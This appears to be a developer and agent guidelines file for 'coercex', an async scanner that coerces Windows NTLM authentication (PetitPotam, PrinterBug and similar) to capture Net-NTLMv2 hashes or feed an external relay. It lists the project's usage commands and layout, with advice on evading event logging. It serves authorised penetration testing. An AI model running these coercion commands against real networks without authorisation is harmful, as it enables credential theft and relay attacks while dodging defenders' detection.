# coercex -- Agent Guidelines

Async NTLM authentication coercion scanner replacing Coercer.  Two modes:
**scan** (detect coercible methods, runs local listener) and **coerce**
(fire-and-forget triggers aimed at an external relay).

## Scanning Modes & Optimization

coercex supports two scanning strategies controlled by `--stop-on-coerced`:

### Fast Scan (--stop-on-coerced)

**Goal:** Find one working coercion method ASAP for immediate exploitation.

**Behavior:**
- **Method-sequential, target-parallel execution** — one method at a time
  across all targets, guarantees priority order
- **Priority-based ordering** — tries most-likely-coercible methods first:
  1. MS-EFSR (PetitPotam) - priority 1
  2. MS-RPRN (PrinterBug) - priority 2
  3. MS-DFSNM (DFSCoerce) - priority 3
  4. MS-PAR (Async Print) - priority 4
  5. MS-EVEN (Eventlog) - priority 5
  6. MS-FSRVP (ShadowCoerce) - priority 6
  7. MS-TSCH (Task Scheduler) - priority 7
- **Only tests default path_style** (first in `path_styles` list) to minimize
  noise
- **Pre-flight endpoint probing** — tests connectivity to unique (pipe, uuid)
  bindings before attempting triggers, eliminates ~40-50% of futile attempts
- **Connection pool warming** — pre-flight probe sessions are cached and
  reused by subsequent trigger calls
- **Stops when first COERCED result found** — removes target from scan set

**OPSEC-conscious variant:**
```bash
uv run coercex scan TARGET -u USER -p PASS --stop-on-coerced \
  -c 1 --transport http --delay 2
```
- `-c 1` = no temporal correlation (one attempt at a time)
- `--transport http` = avoid SMB event logging (EventID 4648/8004)
- `--delay 2` = 2-second delay between attempts (spread over time)

### Full Scan (default)

**Goal:** Comprehensive testing for pentesting reports.

**Behavior:**
- **All combinations upfront** — methods × targets × bindings × path_styles
- **Fully parallel execution** — bounded only by `-c/--concurrency` semaphore
- **Tests all path_styles** — identifies every coercible method/path combo
- **Priority-sorted output** — results displayed in priority order for clarity
- **Pre-flight probing still runs** — eliminates unreachable endpoints upfront

### Pre-flight Endpoint Probing

Before attempting any triggers, the scanner:
1. Extracts unique `(pipe, uuid, version)` bindings from selected methods
2. Tests connectivity to each binding on each target in parallel
3. Marks endpoints as reachable/unreachable (displayed in progress output)
4. Only attempts triggers on reachable endpoints
5. Warms the connection pool (sessions are cached for reuse)

**Typical results:** 12 unique bindings across all 19 methods, ~40-50% unreachable
on average Windows targets (missing services, unregistered interfaces).

## Build & Run

```bash
# Install into venv (always use uv, never pip directly)
uv sync

# Run the CLI
uv run coercex scan  TARGET -l LISTENER_IP
uv run coercex coerce TARGET -l RELAY_IP

# Editable install already handled by uv sync; no separate pip install -e.
```

## Lint & Type-check

```bash
# Ruff -- via nix (no local install)
nix run nixpkgs#ruff -- check src/
nix run nixpkgs#ruff -- format --check src/

# mypy -- installed as dev dep
uv run mypy src/coercex/
```

No `[tool.ruff]` or `[tool.mypy]` config exists; tools run with defaults.

## Tests

```bash
# Run all tests (186 tests)
uv run pytest

# Run all tests with verbose output
uv run pytest -xvs

# Run a single test file
uv run pytest tests/test_display.py -v

# Run a single test
uv run pytest tests/test_scanner_attempt.py::test_drain_enriches_coerced_missing_auth -v

# Run tests matching a keyword
uv run pytest -k "drain" -v
```

Tests live under `tests/` at the repo root:

```
tests/
  test_display.py            ScanDisplay widget (41 tests)
  test_scanner_attempt.py    _attempt() and _drain_callbacks() (53 tests)
  test_listener.py           Listener core (SMB/HTTP handlers)
  test_listener_callback.py  Callback correlation and token resolution
  test_listener_race.py      Race conditions in concurrent callbacks
  test_errors.py             classify_error() mapping
  test_methods.py            Method registry and filtering
  test_ms_rprn.py            MS-RPRN method specifics
  test_utils.py              Utility functions
```

Use `pytest-asyncio` for any async test functions (already a dev dependency).

## Project Layout

```
src/coercex/
  cli/
    __init__.py   Typer CLI (scan + coerce commands), _setup_logging() with RichHandler
    display.py    ScanDisplay: Rich Live TUI with progress bars, findings table, phases
    options.py    Typer option type aliases (Annotated helpers)
    output.py     JSON/file output (post-scan serialization)
  listener/
    __init__.py   Async HTTP + SMB listener, token correlation, hash capture, AuthCallback
    ntlm.py       NTLM challenge/response parsing, Net-NTLMv2 hash extraction
    smb2.py       SMB2 protocol constants and packet structures
  methods/
    __init__.py   METHODS registry, get_methods() filtering
    base.py       CoercionMethod dataclass, PathStyle type
    ms_efsr.py    10 methods  (MS-EFSR / EfsRpc*)
    ms_rprn.py    2 methods   (MS-RPRN / RpcRemoteFindFirstPrinterChangeNotification*)
    ms_dfsnm.py   2 methods   (MS-DFSNM / NetrDfsAddStdRoot, NetrDfsRemoveStdRoot)
    ms_fsrvp.py   2 methods   (MS-FSRVP / IsPathSupported, IsPathShadowCopied)
    ms_even.py    1 method    (MS-EVEN / ElfrOpenBELW)
    ms_par.py     1 method    (MS-PAR / RpcAsyncOpenPrinter)
    ms_tsch.py    1 method    (MS-TSCH / SchRpcRegisterTask)
  scanner.py      Scan/coerce orchestrator, pre-flight probing, callback correlation
  connection.py   DCERPCPool, trigger_method(), async connection pooling, double-lock
  models.py       ScanConfig, ScanResult, ScanStats dataclasses
  errors.py       classify_error() mapping DCERPC errors to TriggerResult
  utils.py        TriggerResult enum, Transport enum, helper functions
  net.py          Network utilities (auto-detect listener IP)
  unc.py          UNC path generation (SMB, HTTP/WebDAV formats)
  redirect.py     Port redirect: pydivert (Windows only)
```

## Code Style

### Imports

- Always start with `from __future__ import annotations`.
- Three groups separated by blank lines: stdlib, third-party, local.
- Alphabetical within each group.
- Heavy imports (impacket) should be deferred inside functions to keep
  module-level import time low.

### Formatting & Naming

- Modules: `snake_case`.  Classes: `PascalCase`.  Constants/enum members:
  `SCREAMING_SNAKE`.  Private names: leading `_`.
- Section dividers: `# -- Name --------------------` style.
- Logger: always `log = logging.getLogger("coercex.<module>")` (never `logger`).
- Log calls use `%`-style formatting, never f-strings.

### Types

- PEP 604 unions: `str | None`, not `Optional[str]` (exception: Typer
  `Annotated` signatures where `Optional` is required).
- Lowercase generics: `list[str]`, `dict[str, Any]`.
- Use `Any` for impacket objects that lack type stubs.
- Trigger functions (`_trigger_*` in method files) are currently untyped.

### Data Structures

- Prefer `@dataclass` for all structured data.  No NamedTuple, TypedDict,
  attrs, or Pydantic.

### Error Handling

- String-based classification via `classify_error()` in `utils.py`.
- Layered try/except with increasing generality.
- No custom exception classes.

### Async Patterns

- `asyncio.to_thread()` wraps all synchronous impacket calls.
- `asyncio.Semaphore` for bounded concurrency.
- `asyncio.start_server` for listeners.
- Double-lock pattern (global + per-key) for session pooling in
  `connection.py`.

### Docstrings & Comments

- Module-level docstrings are prose.
- Function docstrings: informal Google-ish style with `Args:` / `Returns:`.
- Use `match/case` for dispatch on enums and string literals.

### Commits

- Imperative mood.  Optional `feat:` / `fix:` / `docs:` prefix.

## OPSEC Considerations

See `research/opsec-smb-handshake.md` for the full analysis.

Key points for developers modifying the listener or trigger pipeline:

- coercex performs a **full SMB2 handshake** (NEGOTIATE, SESSION_SETUP,
  TREE_CONNECT) to capture Net-NTLMv2 hashes via token-based correlation.
- The RPC coercion call itself is the noisiest event; the handshake depth
  adds minimal incremental detection surface.
- SESSION_SETUP generates Windows events 4648/8004 **only** when NTLM
  auditing is explicitly enabled on the victim.
- TREE_CONNECT events (5140/5145) fire on the **listener** (our side), not
  the victim -- they do not increase victim-side noise.
- Completing the full handshake looks more legitimate than dropping the
  connection after NEGOTIATE.
- For high-security environments, prefer `--transport http` to avoid SMB
  event logging entirely.

Do not weaken the handshake (e.g., dropping SESSION_SETUP) without
understanding the detection trade-offs documented in the research file.

## Port Redirect & pydivert

`redirect.py` provides `PortRedirector` (ABC) with a Windows-only backend:

- **`PydivertRedirector`** (Windows) -- uses the WinDivert kernel driver via
  the `pydivert` package with daemon threads that rewrite packet ports in
  real time.

Linux iptables support was removed because it adds no value over direct port
binding (both require root, port conflicts are rare on pentesting boxes).

**Why it exists:** Standard UNC paths (`\\host\share`) always connect to port
445.  When the user cannot bind port 445 (e.g., Windows workstation with SMB
Server running), the listener binds a non-standard port (e.g., 4445) and the
redirector transparently forwards inbound traffic from 445 to 4445.

`pydivert` is a **conditional dependency** (`sys_platform == 'win32'` in
`pyproject.toml`).  Never import it unconditionally at module level.

## Key Design Decisions

- **impacket is synchronous** -- every DCERPC/SMB call goes through
  `asyncio.to_thread()`.  Never call impacket directly from an async
  context.
- **Connection pooling** -- `DCERPCPool` in `connection.py` keys sessions by
  `(target, pipe, uuid)`.  A double-lock pattern prevents duplicate
  connections to the same endpoint.
- **Callback correlation** -- Three layers: (1) token-based via UNC path
  (primary), (2) IP-based FIFO for HTTP handler, (3) timestamp + IP
  fallback in `_attempt()` with transport check to prevent cross-transport
  false positives.  Drain enrichment only upgrades COERCED results
  missing credentials -- no ACCESSIBLE/UNKNOWN_ERROR sweeps.
- **`--transport` accepts multiple values** -- scan/coerce can try both SMB
  and HTTP simultaneously.
- **19 methods across 7 protocols** -- all defined declaratively in
  `methods/ms_*.py` and registered in `methods/__init__.py`.
